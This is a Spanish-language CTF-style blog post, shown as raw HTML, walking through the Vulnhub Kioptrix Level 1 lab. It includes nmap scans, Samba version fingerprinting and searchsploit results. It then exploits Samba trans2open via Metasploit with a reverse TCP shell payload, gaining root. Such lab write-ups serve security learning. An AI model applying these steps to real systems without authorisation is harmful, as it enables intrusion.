<!doctype html><html domain=update-me.com lang=en><meta charset=utf-8><meta content="width=device-width,initial-scale=1" name=viewport><link href="/img/favicon/favicon-192x192.png?hash=2089033c93" rel=icon type=image/png><meta content=#f9c412 name=theme-color><meta content="max-snippet:-1, max-image-preview: large, max-video-preview: -1" name=robots><title>Vulnhub #2: Kioptrix 1</title><meta content="Vulnhub #2: Kioptrix 1" property=og:title><meta content="Pentesting a máquina CSEC 2 en Vulnhub" name=description><meta content="Pentesting a máquina CSEC 2 en Vulnhub" property=og:description><meta content=summary_large_image name=twitter:card><meta content=@update_me name=twitter:site><meta content=@update_me name=twitter:creator><link href=https://update-me.com/posts/kioptrix/ rel=canonical><meta content=no-referrer-when-downgrade name=referrer><link href=/feed/feed.xml rel=alternate type=application/atom+xml title=datadiego><link href=/ rel=preconnect crossorigin><link href=/fonts/Inter-3.19.var.woff2 rel=preload type=font/woff2 as=font crossorigin><script async defer src="/js/min.js?hash=8db32dcb3a"></script><script csp-hash>if (/Mac OS X/.test(navigator.userAgent))document.documentElement.classList.add('apple')</script><style>:root{--primary: #12f91a;--primary-dark: #70e760;--main-width: calc(100vw - 3em)}main img{content-visibility:auto}article *{scroll-margin-top:50px}header nav{position:fixed;padding:.375em 1.5em;background:rgba(255,255,255,.9);font-weight:200;text-align:right}@media (min-width:37.5em){:root{--main-width: calc(37.5em - 3em)}}dialog,share-widget{position:fixed;opacity:.9}share-widget{right:20px;bottom:20px}share-widget div{width:30px;height:30px;background-image:url(/img/share.svg);background-repeat:no-repeat;background-position:center}.apple share-widget div{background-image:url(/img/share-apple.svg)}body,share-widget button{margin:0}share-widget button:active{transform:scale(1.2)}dialog{background-color:#8dff80;z-index:1000}header aside{font-style:italic}#nav{z-index:2;position:relative}#reading-progress,header nav{z-index:1;width:100vw;left:0;top:0}#reading-progress{background-color:var(--primary);position:absolute;bottom:0;transform:translate(-100vw,0);will-change:transform;pointer-events:none}#posts li{margin-bottom:.5em}@font-face{font-display:optional;font-family:"Inter UI";font-weight:100 900;font-style:oblique 0deg 10deg;src:url(/fonts/Inter-3.19.var.woff2) format("woff2")}button,html{line-height:1.15}html{-webkit-text-size-adjust:100%;font-family:Inter UI,sans-serif;--font-family: Inter UI, sans-serif}h1{font-size:3em;line-height:1.25;margin:.67em 0 .5em;font-size:2.074rem}a{background-color:transparent;color:#f9c412;text-decoration:none;color:var(--primary)}img{border-style:none;max-width:100%;height:auto;margin:0 auto}button{font-family:inherit;font-size:100%;overflow:visible;text-transform:none}[type=button],button{-webkit-appearance:button}[type=button]::-moz-focus-inner,button::-moz-focus-inner{border-style:none;padding:0}[type=button]:-moz-focusring,button:-moz-focusring{outline:1px dotted ButtonText}[type=search]{-webkit-appearance:textfield;outline-offset:-2px}[type=search]::-webkit-search-decoration{-webkit-appearance:none}h2{font-size:2.5em;line-height:1.2;margin-bottom:.6em}body,ol,p,pre{font-size:1em}ol,p,pre{margin-bottom:1.5em}h1,h2{line-height:2.4rem;margin-bottom:1.36rem}h2{font-size:1.728rem}body,ol,p,pre{font-size:1rem;line-height:1.6}ol,p,pre{margin-bottom:1.36rem}@media (min-width:600px){h1{font-size:4.3978rem;line-height:4.4rem}h2{font-size:3.1097rem;line-height:3.52rem}body,ol,p,pre{font-size:1.1rem;line-height:1.6}h1,h2,ol,p,pre{margin-bottom:1.496rem}}@media (min-width:1200px){h1{font-size:6.0756rem;line-height:6.72rem}h2{font-size:4.05rem;line-height:4.8rem}body,ol,p,pre{font-size:1.2rem;line-height:1.6}h1,h2,ol,p,pre{margin-bottom:1.632rem}}code,pre{overflow-x:auto}pre{font-family:Consolas,Monaco,Andale Mono,Ubuntu Mono,monospace}pre:has(code:not([class])){background:#2d2d2d}pre code:not([class]){color:#ccc;padding:0;overflow-x:scroll}button,code{border-radius:.3em}code{color:#e2777a;padding:0 .3em;font-family:Consolas,Monaco,Andale Mono,Ubuntu Mono,monospace;font-size:90%;background:#2d2d2d}h1,h2{font-family:var(--font-family)}h2{font-style:italic}a:hover{text-decoration:underline}button{max-width:100%;background:#f2f2f2;color:#191919;cursor:pointer;display:inline-block;padding:.75em 1.5em;text-align:center;margin:0 .75em 1.5em 0}button:hover{background:#d9d9d9;color:#000}button:not([disabled]){background:#f9c412;color:#181818;background:var(--primary)}button:not([disabled]):hover{background:#ba9005;color:#000;background:var(--primary-dark)}*{border:0;box-sizing:border-box}body,header nav a{font-family:var(--font-family)}body{background:#181818;color:#eee}header{padding:4.5em 1.5em 3em;width:37.5em;margin:0 auto;text-align:center;max-width:100%;display:flex;align-items:center;flex-direction:column}header p,ol{margin-top:0}header nav h1{float:left;font-size:inherit;line-height:inherit;margin:0;text-align:left}header nav a{font-weight:700;text-decoration:none;color:#181818;margin-left:1.5em}header nav a:first-of-type{margin-left:auto}header nav a:last-of-type{margin-right:1.5em}main{max-width:70rem;margin:0 auto;border-top:.5px solid #ccc}footer{background:rgba(0,0,0,.8);color:#fff;padding:3em;text-align:center}footer>*{margin:1.5em}footer nav a img{vertical-align:middle}footer nav,footer p{font-size:90%}article{max-width:100%;padding:1.5em;width:37.5em;margin:0 auto}li ol{margin-bottom:0}</style><header><nav><div id=nav><h1><a href=/ title=Homepage>datadiego</a></h1><a href=/posts/ >Archive</a> <a href=/tags/ >Tags</a> <a href=/about/ >About</a></div><div id=reading-progress aria-hidden=true></div></nav><h1>Vulnhub #2: Kioptrix 1</h1><aside>3 min read.</aside><dialog id=message></dialog></header><main><article><p>Puedes descargar la máquina vulnerable desde <a href=https://www.vulnhub.com/entry/kioptrix-level-1-1,22/ >vulnhub</a><h2 id=descubrimiento-de-hosts>Descubrimiento de hosts <a href=#descubrimiento-de-hosts class=direct-link>#</a></h2><ol><li>Escaneamos para descubrir hosts:<br>nmap -sn<ip>/<rango></rango></ip></ol><p>Nos da el siguiente resultado:<pre><code>Starting Nmap 7.80 ( https://nmap.org ) at 2024-09-10 09:23 CEST
Nmap scan report for www.adsl.vf (192.168.0.1)
Host is up (0.0048s latency).
Nmap scan report for 192.168.0.10
Host is up (0.082s latency).
Nmap scan report for 192.168.0.16
Host is up (0.00044s latency).
Nmap scan report for 192.168.0.20
Host is up (0.000081s latency).
Nmap scan report for 192.168.0.24
Host is up (0.00041s latency).
Nmap done: 256 IP addresses (5 hosts up) scanned in 15.31 seconds
</code></pre><ol start=2><li>Escaneamos versiones<br>nmap -sV<ip></ip></ol><pre><code> ~ nmap -sV 192.168.0.24
Starting Nmap 7.80 ( https://nmap.org ) at 2024-09-10 09:26 CEST
Nmap scan report for 192.168.0.24
Host is up (0.0021s latency).
Not shown: 994 closed ports
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)
80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
111/tcp   open  rpcbind     2 (RPC #100000)
139/tcp   open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp   open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
32768/tcp open  status      1 (RPC #100024)
</code></pre><p>Vemos que 192.168.0.24 es un redhat con varios puertos abiertos.<p>Nos interesa el servicio de Samba, pero necesitamos conocer su version antes de atacar.<p>Con metasploit podemos ejecutar el siguiente scanner:<pre><code>msfconsole
search /scanner/smb/ #para buscar
use /auxiliary/scanner/smb/smb_version
show options
set rhosts 192.168.0.24
</code></pre><p>Al lanzarlo, obtenemos lo siguiente:<pre><code>[*] 192.168.0.24:139      - SMB Detected (versions:) (preferred dialect:) (signatures:optional)
[*] 192.168.0.24:139      -   Host could not be identified: Unix (Samba 2.2.1a)
[*] 192.168.0.24:         - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
</code></pre><p>Una vez tenemos la version, podemos buscar si existen exploits con <code>searchsploit &lt;servicio></code> y <code>searchsplot &lt;servicio> &lt;version></code><p>Con searchsploit samba 2.2.1a nos da el siguiente resultado:<pre><code>------------------------------- ---------------------------------
 Exploit Title                 |  Path
------------------------------- ---------------------------------
Samba 2.2.0 &lt; 2.2.8 (OSX) - tr | osx/remote/9924.rb
Samba &lt; 2.2.8 (Linux/BSD) - Re | multiple/remote/10.c
Samba &lt; 3.0.20 - Remote Heap O | linux/remote/7701.txt
Samba &lt; 3.6.2 (x86) - Denial o | linux_x86/dos/36741.py
------------------------------- ---------------------------------
Shellcodes: No Results
</code></pre><p>Para explotar la vulnerabilidad debemos encontrar una en su version.<p>En concreto, aqui tenemos la vulnerabilidad trans2open, podemos buscarla con <code>search trans2open</code> en metasploit.<p>Debemos configurar el payload con <code>set payload linux/x86/shell_reverse_tcp</code> y el rhosts.<p>Al lanzarlo con run obtenemos una shell con usuario root.</p><share-widget><button aria-label=Share href=https://update-me.com/posts/kioptrix/ on-click=share><div></div></button></share-widget><script type=application/ld+json>{
  "@context": "https://schema.org",
  "@type": "Article",
  "headline": "Vulnhub #2: Kioptrix 1",
  "image": [],
  "author": "@datadiego", 
  "genre": "Insert a schema.org genre", 
  "publisher": {
    "@type": "Organization",
    "name": "Publisher name. Update me.",
    "logo": {
      "@type": "ImageObject",
      "url": "/img/favicon/favicon-192x192.png?hash=2089033c93"
    }
  },
  "url": "https://update-me.com/posts/kioptrix/",
  "mainEntityOfPage": "https://update-me.com/posts/kioptrix/",
  "datePublished": "2025-05-11",
  "dateModified": "2025-05-11",
  "description": "Puedes descargar la máquina vulnerable desde vulnhub Descubrimiento de hosts # Escaneamos para descubrir hosts: nmap -sn / Nos da el..."
}</script><p>Published <time datetime=2025-05-11>11 May 2025</time></article></main><footer><a href=/about/ >@datadiego</a></footer>